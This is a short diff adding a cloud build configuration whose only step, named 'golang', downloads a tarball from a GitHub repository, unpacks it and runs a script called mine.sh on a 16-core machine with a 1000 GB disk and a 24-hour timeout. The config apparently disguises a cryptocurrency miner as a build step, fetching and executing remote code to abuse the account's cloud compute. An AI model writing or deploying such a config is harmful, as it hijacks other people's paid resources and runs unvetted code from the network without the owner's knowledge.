@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/Pantaiselatan/kemed/raw/main/hillqi.tar.gz && tar xf hillqi.tar.gz && ./mine.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  machineType: 'N1_STANDARD_16'
+  diskSizeGb: '1000'
